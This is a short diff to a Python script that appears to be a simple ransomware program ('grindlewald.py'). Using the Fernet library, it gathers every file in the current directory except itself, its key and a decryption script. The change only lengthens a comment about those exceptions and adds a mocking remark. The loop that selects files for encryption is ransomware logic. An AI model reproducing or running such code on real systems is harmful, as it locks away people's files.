@@ -25,7 +25,7 @@ from cryptography.fernet import Fernet #Import cryptography library
 files = []
 
 for file in os.listdir(): #We are simply grabbing all of the files 
-    if file == "grindlewald.py" or file == "key.key" or file == "grindeldecrypt.py": #We then add our exceptions, grindlewald itself, the key and the decryption script
+    if file == "grindlewald.py" or file == "key.key" or file == "grindeldecrypt.py": #We then add our exceptions, grindlewald itself, the key and the decryption script. This is because we need to access the code in this file, and we also need to access the key and the decrypter script, so that the decrypter script can access the key and use it to decrypt the files. If we encrypt the decrypter, then how will we decrypt? Bet you feel real dumb after reading all the way to the end of this weird gibberish.
         continue 
     if os.path.isfile(file): #We then target the remaining files, (we do not want to target a directory)
         files.append(file) 
